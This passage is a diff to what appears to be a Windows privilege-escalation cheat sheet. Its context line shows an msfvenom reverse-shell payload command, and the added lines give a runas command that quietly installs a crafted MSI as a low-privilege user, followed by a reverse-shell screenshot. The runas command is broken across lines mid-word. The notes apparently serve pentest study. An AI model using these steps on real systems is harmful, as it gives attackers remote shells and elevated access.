@@ -402,6 +402,20 @@ msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp L
 
 ![image](https://github.com/user-attachments/assets/d8b07ea9-8e38-4e1f-a47f-4e2fb3497097)
 
+- Sometimes you have to use the runas command to execute the file-: e.g Runas syntax-:
+
+```cmd
+runas /
+user:dev-datasci-lowpriv "msiexec /quiet /qn /i C:\Users\dev-datasci-low
+priv\priest.msi"
+```
+
+![image](https://github.com/user-attachments/assets/7eef7a01-f584-487f-ad95-0839a951c098)
+
+- Revshell-:
+
+![image](https://github.com/user-attachments/assets/5f13e619-deda-4a1f-a1f3-1b5c100ddfde)
+
 
 ### Saved passwords
 
